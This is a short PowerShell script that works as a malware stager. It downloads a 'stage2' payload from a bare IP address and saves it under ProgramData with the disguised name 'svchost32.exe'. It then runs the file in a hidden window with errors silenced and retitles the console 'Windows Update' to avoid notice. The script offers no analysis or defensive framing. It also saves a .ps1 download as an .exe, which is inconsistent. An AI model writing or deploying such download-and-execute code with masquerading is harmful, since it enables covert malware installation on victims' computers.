[CmdletBinding()]
param(
    [string]$TransferUrl = "https://192.0.2.120/stage2.ps1",
    [string]$WorkingPath = 'C:\ProgramData\svchost32.exe'
)
(New-Object System.Net.WebClient).DownloadFile($TransferUrl, $WorkingPath)
Start-Process -FilePath $WorkingPath -WindowStyle Hidden -ErrorAction SilentlyContinue
$Host.UI.RawUI.WindowTitle = "Windows Update"
